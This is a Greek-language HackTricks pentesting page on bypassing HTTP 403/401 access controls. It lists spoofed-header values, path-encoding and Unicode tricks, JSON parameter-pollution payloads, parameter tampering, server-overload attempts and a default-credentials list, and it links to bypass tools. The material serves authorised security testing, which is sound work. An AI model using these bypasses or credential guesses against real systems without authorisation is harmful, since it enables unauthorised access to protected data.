# 403 & 401 Παρακάμψεις

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Άμεση διαθεσιμότητα εγκατάστασης για αξιολόγηση ευπαθειών & δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία & χαρακτηριστικά που καλύπτουν από την αναγνώριση μέχρι την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση & εκμετάλλευση modules για να τους δώσουμε χρόνο να εξερευνήσουν βαθύτερα, να ανοίξουν κελιά και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

## Αναζήτηση HTTP Ρητών/Μεθόδων

Δοκιμάστε να χρησιμοποιήσετε **διαφορετικές ρήτρες** για πρόσβαση στο αρχείο: `GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK`

* Ελέγξτε τις κεφαλίδες απάντησης, ίσως δοθούν κάποιες πληροφορίες. Για παράδειγμα, μια **απάντηση 200** σε **HEAD** με `Content-Length: 55` σημαίνει ότι η **ρήτρα HEAD μπορεί να έχει πρόσβαση στις πληροφορίες**. Αλλά πρέπει ακόμα να βρείτε έναν τρόπο να εξαγάγετε αυτές τις πληροφορίες.
* Χρησιμοποιώντας μια κεφαλίδα HTTP όπως `X-HTTP-Method-Override: PUT` μπορεί να αντικαταστήσει τη ρήτρα που χρησιμοποιήθηκε.
* Χρησιμοποιήστε τη ρήτρα **`TRACE`** και αν έχετε πολύ τύχη ίσως στην απάντηση δείτε επίσης τις **κεφαλίδες που προστέθηκαν από ενδιάμεσους διακομιστές** που μπορεί να είναι χρήσιμες.

## Αναζήτηση Κεφαλίδων HTTP

* **Αλλάξτε την κεφαλίδα Host** σε μια τυχαία τιμή ([που λειτούργησε εδώ](https://medium.com/@sechunter/exploiting-admin-panel-like-a-boss-fc2dd2499d31))
* Δοκιμάστε να [**χρησιμοποιήσετε άλλους User Agents**](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt) για πρόσβαση στον πόρο.
*   **Αναζήτηση Κεφαλίδων HTTP**: Δοκιμάστε να χρησιμοποιήσετε Κεφαλίδες HTTP Proxy, HTTP Authentication Basic και NTLM brute-force (με λίγους συνδυασμούς μόνο) και άλλες τεχνικές. Για όλα αυτά έχω δημιουργήσει το εργαλείο [**fuzzhttpbypass**](https://github.com/carlospolop/fuzzhttpbypass).

* `X-Originating-IP: 127.0.0.1`
* `X-Forwarded-For: 127.0.0.1`
* `X-Forwarded: 127.0.0.1`
* `Forwarded-For: 127.0.0.1`
* `X-Remote-IP: 127.0.0.1`
* `X-Remote-Addr: 127.0.0.1`
* `X-ProxyUser-Ip: 127.0.0.1`
* `X-Original-URL: 127.0.0.1`
* `Client-IP: 127.0.0.1`
* `True-Client-IP: 127.0.0.1`
* `Cluster-Client-IP: 127.0.0.1`
* `X-ProxyUser-Ip: 127.0.0.1`
* `Host: localhost`

Αν η **διαδρομή είναι προστατευμένη** μπορείτε να δοκιμάσετε να παρακάμψετε την προστασία της διαδρομής χρησιμοποιώντας αυτές τις άλλες κεφαλίδες:

* `X-Original-URL: /admin/console`
* `X-Rewrite-URL: /admin/console`
* Αν η σελίδα είναι **πίσω από έναν διακομιστή proxy**, ίσως είναι το proxy αυτό που σας εμποδίζει να έχετε πρόσβαση στις ιδιωτικές πληροφορίες. Δοκιμάστε να καταχραστείτε το [**HTTP Request Smuggling**](../../pentesting-web/http-request-smuggling/) **ή** [**κεφαλίδες hop-by-hop**](../../pentesting-web/abusing-hop-by-hop-headers.md)**.**
* Αναζητήστε [**ειδικές κεφαλίδες HTTP**](special-http-headers.md) ψάχνοντας για διαφορετική απάντηση.
* **Αναζητήστε ειδικές κεφαλίδες HTTP** ενώ αναζητάτε **Μέθοδους HTTP**.
* **Αφαιρέστε την κεφαλίδα Host** και ίσως να μπορέσετε να παρακάμψετε την προστασία.

## Αναζήτηση Διαδρομής

Αν το _/διαδρομή_ είναι αποκλεισμένο:

* Δοκιμάστε να χρησιμοποιήσετε _**/**_**%2e/διαδρομή \_(αν η πρόσβαση είναι αποκλεισμένη από έναν διακομιστή proxy, αυτό μπορεί να παρακάμψει την προστασία). Δοκιμάστε επίσης**\_\*\* /%252e\*\*/διαδρομή (διπλή κωδικοποίηση URL)
* Δοκιμάστε **Παράκαμψη Unicode**: _/**%ef%bc%8f**διαδρομή_ (Οι κωδικοποιημένοι χαρακτήρες URL είναι σαν "/") οπότε όταν αποκωδικοποιηθούν θα είναι _//διαδρομή_ και ίσως έχετε ήδη παρακάμψει τον έλεγχο ονόματος _/διαδρομή_
* **Άλλες παρακάμψεις διαδρομής**:
* site.com/μυστικό –> HTTP 403 Απαγορεύεται
* site.com/ΜΥΣΤΙΚΟ –> HTTP 200 Εντάξει
* site.com/μυστικό/ –> HTTP 200 Εντάξει
* site.com/μυστικό/. –> HTTP 200 Εντάξει
* site.com//μυστικό// –> HTTP 200 Εντάξει
* site.com/./μυστικό/.. –> HTTP 200 Εντάξει
* site.com/;/μυστικό –> HTTP 200 Εντάξει
* site.com/.;/μυστικό –> HTTP 200 Εντάξει
* site.com//;//μυστικό –> HTTP 200 Εντάξει
* site.com/μυστικό.json –> HTTP 200 Εντάξει (ruby)
* Χρησιμοποιήστε όλη [**αυτή τη λίστα**](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt) στις ακόλουθες καταστάσεις:
* /FUZZμυστικό
* /FUZZ/μυστικό
* /μυστικόFUZZ
* **Άλλες παρακάμψεις API:**
* /v3/δεδομένα_χρηστών/1234 --> 403 Απαγορεύεται
* /v1/δεδομένα_χρηστών/1234 --> 200 Εντάξει
* {“id”:111} --> 401 Μη εξουσιοδοτημένο
* {“id”:\[111]} --> 200 Εντάξει
* {“id”:111} --> 401 Μη εξουσιοδοτημένο
* {“id”:{“id”:111\}} --> 200 Εντάξει
* {"user_id":"\<legit_id>","user_id":"\<victims_id>"} (Ρύπανση Παραμέτρου JSON)
* user_id=ATTACKER_ID\&user_id=VICTIM_ID (Ρύπανση Παραμέτρου)
## **Αλλαγή Παραμέτρου**

* Αλλαγή **τιμής παραμέτρου**: Από **`id=123` --> `id=124`**
* Προσθήκη επιπλέον παραμέτρων στο URL: `?`**`id=124` —-> `id=124&isAdmin=true`**
* Αφαίρεση των παραμέτρων
* Αναδιάταξη των παραμέτρων
* Χρήση ειδικών χαρακτήρων.
* Εκτέλεση δοκιμών ορίων στις παραμέτρους — παρέχοντας τιμές όπως _-234_ ή _0_ ή _99999999_ (μόνο μερικές παραδειγματικές τιμές).

## **Έκδοση Πρωτοκόλλου**

Αν χρησιμοποιείτε HTTP/1.1 **δοκιμάστε να χρησιμοποιήσετε το 1.0** ή ακόμη να ελέγξετε αν υποστηρίζει το **2.0**.

## **Άλλες Παρακάμψεις**

* Λάβετε την **IP** ή το **CNAME** του domain και δοκιμάστε να **επικοινωνήσετε μαζί του απευθείας**.
* Δοκιμάστε να **επιβαρύνετε τον διακομιστή** στέλνοντας συνήθεις αιτήσεις GET ([Λειτούργησε για αυτόν τον άνθρωπο με το Facebook](https://medium.com/@amineaboud/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125)).
* **Αλλαγή του πρωτοκόλλου**: από http σε https, ή από https σε http
* Πηγαίνετε στο [**https://archive.org/web/**](https://archive.org/web/) και ελέγξτε αν στο παρελθόν αυτό το αρχείο ήταν **παγκοσμίως προσβάσιμο**.

## **Επίθεση Βίας**

* **Μαντέψτε τον κωδικό πρόσβασης**: Δοκιμάστε τα ακόλουθα συνηθισμένα διαπιστευτήρια. Γνωρίζετε κάτι για το θύμα; Ή το όνομα της πρόκλησης CTF;
* [**Επίθεση βίας**](../../generic-methodologies-and-resources/brute-force.md#http-brute)**:** Δοκιμάστε βασική, digest και NTLM πιστοποίηση.

{% code title="Συνηθισμένα διαπιστευτήρια" %}
```
admin    admin
admin    password
admin    1234
admin    admin1234
admin    123456
root     toor
test     test
guest    guest
```
{% endcode %}

## Αυτόματα Εργαλεία

* [https://github.com/lobuhi/byp4xx](https://github.com/lobuhi/byp4xx)
* [https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403)
* [https://github.com/gotr00t0day/forbiddenpass](https://github.com/gotr00t0day/forbiddenpass)
* [Επέκταση Burp - 403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122)
* [Forbidden Buster](https://github.com/Sn1r/Forbidden-Buster)

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Άμεση εγκατάσταση για αξιολόγηση ευπαθειών & δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία & χαρακτηριστικά που καλύπτουν από την αναγνώριση μέχρι την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση & εκμετάλλευση modules για να τους δώσουμε πίσω χρόνο να εξερευνήσουν βαθύτερα, να ανοίξουν κελιά και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
